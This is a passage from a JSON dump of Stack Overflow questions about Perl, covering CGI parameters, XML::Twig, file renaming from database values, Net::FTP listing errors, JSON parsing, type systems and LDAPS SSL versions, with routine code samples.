202,204 of PBP.  (Severity: 5)\nnot ok 8        Two-argument \"open\" used at line 390, column 13.  See page 207 of PBP.  (Severity: 5)\nnot ok 9        Bareword file handle opened at line 522, column 5.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 10       Two-argument \"open\" used at line 522, column 5.  See page 207 of PBP.  (Severity: 5)\nnot ok 11       Bareword file handle opened at line 615, column 10.  See pages 202,204 of PBP.  (Severity: 5)\nnot ok 12       Two-argument \"open\" used at line 615, column 10.  See page 207 of PBP.  (Severity: 5)\n</code></pre>\n\n<p>But i still cannot get Jenkins to recognize the TAP file format, and i get an error:</p>\n\n<pre><code>Found matching files but did not find any TAP results.\n</code></pre>\n"},{"tags":["osx","perl","imagemagick","homebrew"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":179,"score":2,"question_id":10661085,"title":"How to install PerlMagick on Mac OSX using Homebrew?","body":"<p>I have successfully installed ImageMagick using Homebrew but I can't get PerlMagick to install properly using the instructions here: <a href=\"http://www.imagemagick.org/script/perl-magick.php\" rel=\"nofollow\">http://www.imagemagick.org/script/perl-magick.php</a></p>\n\n<p>I get a lot of errors on Magick.xs. Anyone has any idea how to do this properly?</p>\n"},{"tags":["jquery","perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":86,"score":1,"question_id":12992087,"title":"jquery post object and perl cgi","body":"<p>with jquery i trying to post standard object to perl cgi script</p>\n\n<p>js var data:</p>\n\n<pre><code>{\n alias: [\"a1\",\"a2\",\"a3\"],\n ip: \"127.0.0.1\",\n name: \"name\",\n port: \"80\",\n}\n</code></pre>\n\n<p>js jquery post:</p>\n\n<pre><code>`$.post('/vhosts.cgi',{action: 'save',data: data);`\n</code></pre>\n\n<p>perl:</p>\n\n<pre><code>my $q = CGI-&gt;new;\nprint Dumper($q-&gt;param('data'));\n</code></pre>\n\n<p>result in Dumper is empty; Dump of $q shows that param names are <code>data[ip],data[name]</code> etc,</p>\n\n<p>Dumper($q):</p>\n\n<pre><code>$VAR1 = bless( {\n             '.parameters' =&gt; [\n                                'action',\n                                'data[name]',\n                                'data[ip]',\n                                'data[port]',\n                                'data[alias][]'\n                              ],\n             'data[alias][]' =&gt; [\n                                  'a1',\n                                  'a2',\n                                  'a3'\n                                ],\n             '.charset' =&gt; 'ISO-8859-1',\n             'data[ip]' =&gt; [\n                             '127.0.0.1'\n                           ],\n             'data[port]' =&gt; [\n                               '80'\n                             ],\n             'action' =&gt; [\n                           'savevhost'\n                         ],\n             'data[name]' =&gt; [\n                               'name'\n                             ],\n             '.fieldnames' =&gt; {},\n             'escape' =&gt; 1\n           }, 'CGI' );\n</code></pre>\n\n<p>How i can get <code>data</code> as object or hash in perl ?</p>\n"},{"tags":["perl","xml-twig"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12982590,"title":"adding incremented id attribute to all elements","body":"<p>There is a XML-Twig example that shows how to add id attribute with incremented value to a specified element. Is there easy way to add incremented id to all elements.</p>\n\n<pre><code>#!/bin/perl -w\n\n#########################################################################\n#                                                                       #\n#  This example adds an id to each player                               #\n#  It uses the set_id method, by default the id attribute will be 'id'  #\n#                                                                       #\n#########################################################################\n\nuse strict;\nuse XML::Twig;\n\nmy $id=\"player001\";\n\nmy $twig= new XML::Twig( twig_handlers =&gt; { player =&gt; \\&amp;player } );\n$twig-&gt;parsefile( \"nba.xml\");    # process the twig\n$twig-&gt;flush;\nexit;\n\n  sub player\n    { my( $twig, $player)= @_;\n      $player-&gt;set_id( $id++);\n      $twig-&gt;flush;\n    }\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":90,"score":0,"question_id":12959116,"title":"replace regex match with lines from an external file","body":"<p>Using Perl, I am parsing through a text file and would like to find a keyword and filename, then I need to open that file (it is in the same directory as the file being parsed), take the text from it, and insert it after the match.</p>\n\n<p>file1 = file being parsed</p>\n\n<p>file2 = file to include</p>\n\n<p>Example of the two files in the beginning:</p>\n\n<pre><code>file1\ncode code code\n%include file2;\ncode code code\n\nfile2\n(* a bunch of header information *)\nfunction ( arg : type);\n</code></pre>\n\n<p>And what I would like file1 to look like after:</p>\n\n<pre><code>file1\ncode code code\n(*%include file2;*)\n(* a bunch of header information *)\nfunction ( arg : type);\ncode code code\n</code></pre>\n\n<p>I need help developing the perl to perform this replace. </p>\n\n<p>I have the following written that takes the file to be parsed and reads it as a string. I would like to keep this method as I have already implemented several replaces using it, but the rest is open season. I like to understand things as well so if you would not mind a brief explanation of the submitted solution it would be appreciated.</p>\n\n<pre><code>#keep this part\nopen FILEHANDLE, \"&lt;\", $file or die $!;\n$string = do { local $/; &lt;FILEHANDLE&gt; };\n\n#several other replace operations here already written\n$string ~= s/match/replace;\n\n#can rewrite this to be anything that works well\n#match the include tag\nif ($string =~ m/^%include\\s+'(\\w+).(PRO)'/gi)\n{\n  #build the replace string\n  my $includefile = $1.'.'.$2;\n  my $replacestring = \"(* $&amp; *) \\n\";\n  open my INCLUDEHANDLE, \"&lt;\", $includefile or die $!;\n  $replacestring += do { local $/; &lt;INLCUDEHANDLE&gt; }\n\n  # I am lost at this point\n}\n\n#this is dirty but it works\n#close file for read\nclose FILEHANDLE;\n#open file for write\nopen FILEHANDLE, \"&gt;\", $file or die $!;\nprint FILEHANDLE $string;\n#close file for write\nclose FILEHANDLE;\n</code></pre>\n\n<p>Internet bro-fist for help cleaning up my file read/write operations and for stripping the (* header information *) form the contents of file2 before writing it to file1 like so:</p>\n\n<pre><code>file1\ncode code code\n(*%include file2*)\nfunction ( arg : type);\ncode code code\n</code></pre>\n"},{"tags":["perl","file","in-place"],"answer_count":3,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":537,"score":8,"question_id":6063835,"title":"Need perl inplace editing of files not on command line","body":"<p>I have a program that has a number of filenames configured internally.  The program edits a bunch of configuration files associated with a database account, then changes the database password for the database account.  The list of config files is associated with the name of the database account via an internal list.  When I process these files, I have the following loop in my program:</p>\n\n<pre><code>BEGIN { $^I = '.oldPW'; }  # Enable in-place editing\n...\nforeach (@{$Services{$request}{'files'}})\n{\n    my $filename = $Services{$request}{'configDir'} . '/' . $_;\n    print \"Processing ${filename}\\n\";\n    open CONFIGFILE, '+&lt;', $filename or warn $!;\n    while (&lt;CONFIGFILE&gt;)\n    {\n        s/$oldPass/$newPass/;\n        print;\n    }\n    close CONFIGFILE;\n}\n</code></pre>\n\n<p>The problem is, this writes the modified output to STDOUT, not CONFIGFILE.  How do I get this to actually edit inplace?  Move the $^I inside the loop?  print CONFIGFILE?  I'm stumped.</p>\n\n<blockquote>\n  <p></p>\n</blockquote>\n\n<p><strong>Update:</strong> I found what I was looking for on <a href=\"http://www.perlmonks.org/?node_id=106461\" rel=\"nofollow\">perlmonks</a>.  You can use a local ARGV inside the loop to do inplace editing in the normal perl way.  The above loop now looks like:</p>\n\n<pre><code>foreach (@{$Services{$request}{'files'}})\n{\n    my $filename = $Services{$request}{'configDir'} . '/' . $_;\n    print \"Processing ${filename}\\n\";\n    {\n        local @ARGV = ( $filename);\n        while (&lt;&gt;)\n        {\n            s/$oldPass/$newPass/;\n            print;\n        }\n    }\n}\n</code></pre>\n\n<p>If it weren't for tacking the configDir on the beginning, I could just toss the whole list into the local @ARGV, but this is efficient enough.</p>\n\n<p>Thanks for the helpful suggestions on Tie::File, I'd probably go that way if doing this over.  The config files I'm editing are never more than a few Kbytes in length, so a Tie wouldn't use too much memory.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":115,"score":1,"question_id":12986227,"title":"Hash Key and Value in Perl","body":"<p>I have the question in Perl:Read a series of last names and phone numbers from the given input. The names and numbers should be separated by a comma. Then print the names and numbers alphabetically according to last name. Use hashes.</p>\n\n<pre><code>#!usr/bin/perl\nmy %series = ('Ashok','4365654435' 'Ramnath','4356456546' 'Aniketh','4565467577');\nwhile (($key, $value) = each(sort %series))\n{\n print $key.\",\".$value.\"\\n\";\n}\n</code></pre>\n\n<p>I am not getting the output. Where am I going wrong? Please help. Thanks in advance</p>\n\n<pre><code>#!usr/bin/perl\nmy %series = ('Ashok','4365654435' 'Ramnath','4356456546' 'Aniketh','4565467577');\nprint $_.\",\".$series{$_}.\"\\n\" for sort keys %series;\n</code></pre>\n\n<p>If I execute any of the above 2 programs, I get the same output as:</p>\n\n<pre><code>String found where operator expected at line 2, near \"'4365654435' 'Ramnath'\" (Missing operator before  'Ramnath'?)\nString found where operator expected at line 2, near \"'4356456546' 'Aniketh'\" (Missing operator before  'Aniketh'?)\nsyntax error at line 2, near \"'4365654435' 'Ramnath'\"\nExecution aborted due to compilation errors\n</code></pre>\n\n<p>But according to the question, I think I cannot store the input as <code>my %series = ('Ashok','4365654435','Ramnath','4356456546','Aniketh','4565467577');</code></p>\n"},{"tags":["perl","proxy","web-scraping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12987693,"title":"how to set the proxy server credentials using $mech->proxy","body":"<p>I am making a scraper script.To avoid my script gettng blocked I am using a proxy service which has given me username and password(I havn't done it before).\nHow to implement this in my code is a problem.\nI am doing </p>\n\n<p>my $proxy = '64.120.237.206:8080';</p>\n\n<p>$mech->proxy('http', \"http://$proxy\");</p>\n\n<p>My problem is how and where I should set the username and password given by the proxy service provider.</p>\n\n<p>Please help</p>\n"},{"tags":["java","perl","zip","unzip"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":105,"score":1,"question_id":12980525,"title":"Copy a file or multiple files form a zip file without actually unzipping it using perl or java","body":"<p>I have a couple of zip file which have multiple files and folders. It basically contains text files. Say extension 'a' and 'b'.</p>\n\n<p>I want to separate the extension 'a' files and extension 'b' files into separate zip files, using a perl script or java code.</p>\n\n<p>Instead of unzipping the files, can I just pick the contents and put it into another zip file. Is this even possible? Any help would be great.</p>\n\n<p>The reason why I was wondering this is I have large number of zip files of large size, so if this is possible my code will be very efficient.</p>\n\n<p>And any comments whether to use perl or java would be a bonus.</p>\n\n<p>Thank you.</p>\n"},{"tags":["javascript","html","perl","include","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1016,"score":0,"question_id":4108607,"title":"Include JavaScript in Perl-CGI generated page","body":"<p>I was trying to add a java-script to a page which is generated on the fly.\nI tried this, but it seems like it is not working.</p>\n\n<pre><code>&lt;SCRIPT SRC=\\\"sorttable.js\\\"&gt;&lt;/SCRIPT&gt;\n</code></pre>\n\n<p>I always have to inline javacode along with the html for it to work.\nAny clues ?</p>\n"},{"tags":["multithreading","perl","sleep"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":328,"score":1,"question_id":3721483,"title":"Perl ithreads: Do some math instead of sleeping","body":"<p>I am using perl ithreads and things work fine, unless I decide to have threads sleep. </p>\n\n<p>Lets say my routine thread_job is passed as an entry for several threads to start running concurrently. </p>\n\n<pre><code>thread_job()\n{\n...\nsleep 2;\n\n#do other stuff here\n\n}\n</code></pre>\n\n<p>If I dont have a sleep I have no issues with the threads running and they do their tasks fine. If I add a sleep, my script hangs. I am running this off a windows command prompt, if that helps. </p>\n\n<p>Since I do need to sleep and Im guessing there's an issue with using this sleep on my current setup, I intend to have the thread do something, for a while, instead of sleeping. Is there any such mathematical operation which I could perform?</p>\n"},{"tags":["json","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":68,"score":-5,"question_id":12983428,"title":"Error converting to JSON data malformed JSON string","body":"<p>I'm having an issue with JSON. Perl is telling that there is something wrong with the json file but I ran it thorough the validator and it said it's a 'valid json'.</p>\n\n<p>The error is telling me that there is something wrong with /usr/local/share/perl5/JSON.pm line 171</p>\n\n<p>But I don't have a json file there, please look at error:</p>\n\n<p>$VAR1 = bless( {\n                 'InError' => 1,\n                 'Explanation' => 'Error converting to JSON data malformed JSON string, neither array, object, number, string or atom, at character offset 0 (before \"$VAR1 = bless( {\\n  ...\") at /usr/local/share/perl5/JSON.pm line 171.\n',</p>\n\n<p>I need somebody to point me in the right direction. Thanks.</p>\n\n<p>usaims</p>\n"},{"tags":["mysql","perl","rename"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12982185,"title":"Rename files based on values from a DB","body":"<p>I am very new to Perl and I need to complete a project that is going to rely on it. I need to take pictures that are in a folder, look up their name in a DB and then rename the picture based on another value in that row.</p>\n\n<p>So say I need to rename the picture</p>\n\n<pre><code>010300000000001002.jpg\n</code></pre>\n\n<p>I need to then have the script look in the db for</p>\n\n<pre><code>010300000000001002\n</code></pre>\n\n<p>in the <code>USERID</code>. Then when it finds the match I need it to look for the <code>EMPNUM</code> value in the same row. Then take the <code>EMPNUM</code> value and rename the picture to that value.jpg, which in this case equals 1002. So the end product would end up like this:</p>\n\n<pre><code>Old Picture: 010300000000001002.jpg\nNew Picture: 1002.jpg\n</code></pre>\n\n<p>Then repeat for all of the pictures in that folder.</p>\n\n<p>Read from the DB Script:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nuse DBI;\n# Replace datasource_name with the name of your data source.  AdventureWorksDW \\dbo.DimEmployee\n# Replace database_username and database_password\n# with the SQL Server database username and password.\nmy $data_source = q/not giving the data source/;\nmy $user = q/Not giving the user/;\nmy $password = q/Not Giving the password /;\nmy $dbh = DBI-&gt;connect($data_source, $user, $password)\n    or die \"Can't connect to $data_source: $DBI::errstr\";\n\n# Catch and display status messages with this error handler.\nsub err_handler {\n   my ($sqlstate, $msg, $nativeerr) = @_;\n   # Strip out all of the driver ID stuff\n   $msg =~ s/^(\\[[\\w\\s:]*\\])+//;\n   print $msg;\n   print \"===&gt; state: $sqlstate msg: $msg nativeerr: $nativeerr\\n\";\n   return 0;\n}\n\n$dbh-&gt;{odbc_err_handler} = \\&amp;err_handler;\n\n$dbh-&gt;{odbc_exec_direct} = 1;\n\n# Prepare your sql statement (perldoc DBI for much more info).\nmy $sth = $dbh-&gt;prepare('select userid, empnum from dbo.emp0');\n\n# Execute the statement.\nif ($sth-&gt;execute)\n{\n    # This will keep returning until you run out of rows.\n    while (my $row = $sth-&gt;fetchrow_hashref)\n    {\n        print \"ID = $row-&gt;{userid}, Name = $row-&gt;{empnum}\\n\";\n    }\n}\n\n$dbh-&gt;disconnect;\n</code></pre>\n\n<p>Copy and rename file script:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\n\nmy $i = 1;\nmy @old_names = glob \"/root/pics/*.jpg\";\n\n\nforeach my $old_name (@old_names) {\n\n    my $new_name = \"picture$i\" . \".jpg\";\n\n    rename($old_name, \"/root/pics/$new_name\") or die \"Couldn't rename $old_name to $new_name: $!\\n\";\n\n} continue { $i++ }\n\nprint \"Pictures have been renamed.\\n\";\n</code></pre>\n\n<p>Edit:\nThis is what I ended up with and it does the job.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse File::Copy;\nuse DBI;\n\nmy $data_source = q/db/;\nmy $user = q/user/;\nmy $password = q/password/;\nmy $dbh = DBI-&gt;connect($data_source, $user, $password)\n    or die \"Can't connect to $data_source: $DBI::errstr\";\n\n# Catch and display status messages with this error handler.\nsub err_handler {\n   my ($sqlstate, $msg, $nativeerr) = @_;\n   # Strip out all of the driver ID stuff\n   $msg =~ s/^(\\[[\\w\\s:]*\\])+//;\n   print $msg;\n   print \"===&gt; state: $sqlstate msg: $msg nativeerr: $nativeerr\\n\";\n   return 0;\n}\n$dbh-&gt;{odbc_err_handler} = \\&amp;err_handler;\n$dbh-&gt;{odbc_exec_direct} = 1;\n\nsub move_image \n{\n    my $user_id = $_[0];\n    my $emp_num = $_[1];\n\n    my $old_name = \"/root/picS/${user_id}.jpg\";\n\n    my $new_name = \"/root/picD/${emp_num}.jpg\";\n\n    move($old_name, $new_name) or return 0;\n\n    return 1;\n}\n\n# Prepare your sql statement (perldoc DBI for much more info).\nmy $sth = $dbh-&gt;prepare('select userid, empnum from dbo.emp0');\n\n# Execute the statement.\nif ($sth-&gt;execute)\n{\n    # This will keep returning until you run out of rows.\n    while (my $row = $sth-&gt;fetchrow_hashref)\n    {\n        my $user_id = $row-&gt;{userid};\n        my $emp_num = $row-&gt;{empnum};\n\n        if (move_image($user_id, $emp_num))\n        {\n            print \"Moved image $user_id to $emp_num successfully\\n\";\n        }\n        else\n        {\n            print \"Could not move image $user_id to $emp_num successfully\\n\";\n        }\n    }\n}\n\n$dbh-&gt;disconnect;\n</code></pre>\n"},{"tags":["perl","file","directory"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2578,"score":5,"question_id":4493482,"title":"Detect empty directory with Perl","body":"<p>What is an easy way to test if a folder is empty in perl? -s, and -z are not working.</p>\n\n<p>Example:</p>\n\n<pre><code>#Ensure Apps directory exists on the test PC.\nif ( ! -s $gAppsDir )\n{ \n    die \"\\n$gAppsDir is not accessible or does not exist.\\n\"; \n}\n\n#Ensure Apps directory exists on the test PC.\nif ( ! -z $gAppsDir )\n{ \n    die \"\\n$gAppsDir is not accessible or does not exist.\\n\"; \n}\n</code></pre>\n\n<p>These above, do not work properly to tell me that the folder is empty. Thanks!</p>\n\n<hr>\n\n<p>Thanks all! I ended up using:</p>\n\n<pre><code>sub is_folder_empty { my $dirname = shift; opendir(my $dh, $dirname) or die \"Not a directory\"; \nreturn scalar(grep { $_ ne \".\" &amp;&amp; $_ ne \"..\" } readdir($dh)) == 0; }\n</code></pre>\n"},{"tags":["python","linux","perl","terminal","source-code"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":150,"score":-5,"question_id":12878370,"title":"How to lock source code of terminal ran perl, obj c, c++, python, and ruby etc scripts?","body":"<p>I am looking to sell scripts I made in perl, obj c, c++, python, ruby, bash, php, etc etc etc</p>\n\n<p>They are all ran in the terminal. (Linux)</p>\n\n<p>How can I lock the source code, so my scripts can be distributed without people having access to the source codes..?</p>\n\n<p>In other words, how do you lock the Source Code of a program that is run in Terminal, in so that people can use the program, if the code is downloaded onto their Linux machine, but the actual source code is not accessible to them?</p>\n\n<p>Example:\nexample.pl is a document saved on the Linux Computer, and can be activated with Terminal. But if the user clicks on the actual example.pl document, they can see the actual code. Is it possible to lock this document, but still allow the user to run the program within terminal?</p>\n\n<p>All help is appreciated!</p>\n\n<p>Thanks for the help guys. Now i Can't any more questions because of the down votes... I guess his was a stupid question.</p>\n"},{"tags":["perl","static-analysis","call-graph"],"answer_count":4,"favorite_count":3,"up_vote_count":9,"down_vote_count":0,"view_count":1361,"score":9,"question_id":1295311,"title":"How can I make a static analysis call graph for Perl?","body":"<p>I am working on a moderately complex Perl program. As a part of its development, it has to go through modifications and testing. Due to certain environment constraints, running this program frequently is not an option that is easy to exercise. </p>\n\n<p>What I want is a static call-graph generator for Perl. It doesn't have to cover every edge case(e,g., redefining variables to be functions or vice versa in an eval). </p>\n\n<p>(Yes, I know there is a run-time call-graph generating facility with Devel::DprofPP, but run-time is not guaranteed to call every function. I <em>need</em> to be able to look at each function.)</p>\n"},{"tags":["perl","rename"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":79,"score":0,"question_id":12981461,"title":"Rename files with perl, files get deleted","body":"<p>My code looks like this:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\n\nmy $i = 1;\nmy @old_names = glob \"/root/pics/*.jpg\";\nmy $new_name = \"picture$i\";\n\nforeach my $old_name (@old_names) {\n    rename($old_name, $new_name) or \n        die \"Couldn't rename $old_name to $new_name: $!\\n\";\n} continue { $i++ }\n</code></pre>\n\n<p>when I execute the script it deletes the pictures, what am I doing wrong?</p>\n\n<p>Edit:</p>\n\n<p>This is what worked for me.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\n\nmy $i = 1;\nmy @old_names = glob \"/root/pics/*.jpg\";\n\n\nforeach my $old_name (@old_names) {\n\n    my $new_name = \"picture$i\" . \".jpg\";\n\n    rename($old_name, \"/root/pics/$new_name\") or die \"Couldn't rename $old_name to $new_name: $!\\n\";\n\n} continue { $i++ }\n</code></pre>\n\n<p>Thanks for the help everyone.</p>\n"},{"tags":["php","perl","openssl","aes","cbc-mode"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12965607,"title":"Decoding/encoding openssl aes cbc string between Perl and PHP","body":"<p>I'm writing some server code in PHP and I have an offline process written in Perl and they need to communicate via encrypted strings. In PHP I have been using:</p>\n\n<pre>\n$encrypted_string = openssl_encrypt($my_string, \"aes-128-cbc\", \"my_password\", true, \"1234567812345678\");\n</pre>\n\n<p>I'd basically like to achieve the exact same string output using Perl. Any help with how I would do this is appreciated. Thanks!</p>\n"},{"tags":["perl","redirect","lwp"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":858,"score":4,"question_id":2470053,"title":"How can I get the ultimate URL without fetching the pages using Perl and LWP?","body":"<p>I'm doing some <a href=\"http://en.wikipedia.org/wiki/Web_scraping\" rel=\"nofollow\">web scraping</a> using Perl's LWP. I need to process a set of URLs, some of which may redirect (1 or more times).</p>\n\n<p>How can I get ultimate URL with all redirects resolved, using HEAD method?</p>\n"},{"tags":["linux","perl","ftp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12978776,"title":"perl NET::FTP ls is giving argument too long error","body":"<p>I am a totally newbie to Linux and perl. there is a perl script on one of our linux box which downloads daily generated log files from another linux machine. this script was stopped two months ago and now when I am trying to run it again, it is giving <strong>\"Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 550 Arguments too long\"</strong> error, I looked up for files onto the source machine and found that there are around 36000~ log files have been created so far.</p>\n\n<p>For test purpose \n1.) I used linux ftp command to connect to source machine and list the files using ls which was successful.\n2.) I also logged into the source machine and ran ls command into the log files directory and it was successfully listing the files.</p>\n\n<p>can anyone please advise why this the case with perl script which is getting 550 error code from server for listing those files?</p>\n\n<p>Below is the debug log Trace of perl script which we are using to download files :- </p>\n\n<pre><code>Net::FTP&gt;&gt;&gt; Net::FTP(2.77)\nNet::FTP&gt;&gt;&gt;   Exporter(5.58)\nNet::FTP&gt;&gt;&gt;   Net::Cmd(2.28)\nNet::FTP&gt;&gt;&gt;   IO::Socket::INET(1.31)\nNet::FTP&gt;&gt;&gt;     IO::Socket(1.30)\nNet::FTP&gt;&gt;&gt;       IO::Handle(1.27)\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 220 hostname.server FTP server (Version wu-2.6.2-5-ncx-1 Wed Jun 29 14:53:11 CEST 2005) ready.\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; USER USR\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 331 Password required for USR.\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; PASS ....\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 230 User USR logged in.  Access restrictions apply.\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; CWD /backup\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 250 CWD command successful.\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; PORT 192,168,1,154,217,0\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 200 PORT command successful.\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; NLST\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 550 Arguments too long\n    Net::FTP=GLOB(0x87423fc)&gt;&gt;&gt; QUIT\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 221-You have transferred 0 bytes in 0 files.\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 221-Total traffic for this session was 393 bytes in 0 transfers.\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 221-Thank you for using the FTP service on hostname.server\n    Net::FTP=GLOB(0x87423fc)&lt;&lt;&lt; 221 Goodbye.\n</code></pre>\n\n<p>Thanks in Advance</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":82,"score":5,"question_id":12980026,"title":"what might cause a print error in perl?","body":"<p>I have a long running script that every hour opens a file, prints to it and closes the file.  I've recently found very rarely, the print is failing, not because I'm testing the status of the print itself but rather due to the fact of missing entries in the file until the system is actually rebooted!</p>\n\n<p>I do trap for file open failures and write a message to syslog when that happens and I'm not seeing any open failures so I'm now guessing it may be the print that is failing.  I'm not trapping the print failures, which I suspect most people don't but am now going to update that one print.</p>\n\n<p>Meanwhile, my question is does anyone know what types of situations could cause a print statement to fail when there is plenty of disk storage and no contention for a file which has been successfully opened in append mode?</p>\n"},{"tags":["perl","nan","infinity"],"answer_count":4,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":4449,"score":12,"question_id":1185822,"title":"How do I create or test for NaN or infinity in Perl?","body":"<p>How do I create or test for NaN or infinite values in Perl?</p>\n"},{"tags":["c#","java","python","perl","weakly-typed"],"answer_count":9,"favorite_count":28,"up_vote_count":96,"down_vote_count":1,"view_count":2880,"score":95,"question_id":9929585,"title":"Seeking clarification on apparent contradictions regarding weakly typed languages","body":"<p>I think I understand <a href=\"http://lucacardelli.name/Papers/OnUnderstanding.A4.pdf\">strong typing</a>, but every time I look for examples for what is weak typing I end up finding examples of programming languages that simply coerce/convert types automatically.</p>\n\n<p>For instance, in this article named <a href=\"http://www.artima.com/weblogs/viewpost.jsp?thread=7590\">Typing: Strong vs. Weak, Static vs. Dynamic</a> says that Python is strongly typed because you get an exception if you try to:</p>\n\n<p><strong>Python</strong></p>\n\n<pre><code>1 + \"1\"\nTraceback (most recent call last):\nFile \"\", line 1, in ? \nTypeError: unsupported operand type(s) for +: 'int' and 'str'\n</code></pre>\n\n<p>However, such thing is possible in Java and in C#, and we do not consider them weakly typed just for that.</p>\n\n<p><strong>Java</strong></p>\n\n<pre><code>  int a = 10;\n  String b = \"b\";\n  String result = a + b;\n  System.out.println(result);\n</code></pre>\n\n<p><strong>C#</strong></p>\n\n<pre><code>int a = 10;\nstring b = \"b\";\nstring c = a + b;\nConsole.WriteLine(c);\n</code></pre>\n\n<p>In this another article named <a href=\"http://www.i-programmer.info/programming/theory/1469-type-systems-demystified-part2-weak-vs-strong.html\">Weakly Type Languages</a> the author says that Perl is weakly typed simply because I can concatenate a string to a number and viceversa without any explicit conversion.</p>\n\n<p><strong>Perl</strong></p>\n\n<pre><code>$a=10;\n$b=\"a\";\n$c=$a.$b;\nprint $c; #10a\n</code></pre>\n\n<p>So the same example makes Perl weakly typed, but not Java and C#?.</p>\n\n<p>Gee, this is confusing <img src=\"http://i.stack.imgur.com/U5kPT.gif\" alt=\"enter image description here\"></p>\n\n<p>The authors seem to imply that a language that prevents the application of certain operations on values of different types is strongly typed and the contrary means weakly typed.</p>\n\n<p>Therefore, at some point I have felt prompted to believe that if a language provides a lot of automatic conversions or coercion between types (as perl) may end up being considered weakly typed, whereas other languages that provide only a few conversions may end up being considered strongly typed. </p>\n\n<p>I am inclined to believe, though, that I must be wrong in this interepretation, I just do not why or how to explain it.</p>\n\n<p>So, my questions are: </p>\n\n<ul>\n<li>What does it really mean for a language to be truly weakly typed? </li>\n<li>Could you mention any good examples of weakly typing that are not related to automatic conversion/automatic coercion done by the language?</li>\n<li>Can a language be weakly typed and strongly typed at the same time?</li>\n</ul>\n\n<p>Thanks in advance for any references, use cases or examples that you provide that can lead me into the right direction.</p>\n"},{"tags":["perl","grep"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":68,"score":-3,"question_id":12976895,"title":"Using grep within perl script and piping output to different files","body":"<p>I want to open a list of identifiers and find matches in another file. For this I used grep as a system function with a per script. But i am not sure where i am going wrong. Could you please help me out with the syntax? Thank you for your time!</p>\n\n<pre><code>open F, \"$ARGV[0]\" or die;\nwhile(&lt;F&gt;)\n{\n    `grep -A1 \"$_\" CAM_PROJ_BATS.read.fa &gt; $_.txt`;\n} \n</code></pre>\n"},{"tags":["perl","ssl","ldap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12930672,"title":"Perl Net::LDAPS SSL version negotiation","body":"<h2>Platform</h2>\n\n<ul>\n<li>OS: RHEL 5.4</li>\n<li>Perl: 5.8.8</li>\n<li>OpenSSL: 0.9.8e</li>\n<li>Net::LDAP: 0.33</li>\n</ul>\n\n<h2>Details</h2>\n\n<p>We have a perl script which monitors LDAP servers used by our application and sends alerts if these are not reachable or functional in some way. On the whole this works well except for a particular LDAP server which is only accepting SSLv2. The LDAP object creation looks as follows</p>\n\n<pre><code>my $current_server = Net::LDAP-&gt;new('ldaps://10.1.1.1:636/,\n                     verify =&gt; 'none',\n                     sslversion =&gt; 'sslv23',\n                     timeout =&gt; 30 )\n</code></pre>\n\n<p>Notice <em>sslv23</em>, which according to the <a href=\"http://search.cpan.org/~marschap/perl-ldap-0.49/lib/Net/LDAP.pod\" rel=\"nofollow\">documentation</a>, allows SSLv2 or 3 to be used. The relevant entry in the docs is </p>\n\n<blockquote>\n  <p>sslversion => 'sslv2' | 'sslv3' | 'sslv23' | 'tlsv1'</p>\n</blockquote>\n\n<p>However, the above does not work. When I change the \"sslversion\" to be \"sslv2\" then the script <em>does</em> work.</p>\n\n<h2>Conclusion</h2>\n\n<p>How can I get Net::LDAPS to retry with sslv2 if sslv3 does not 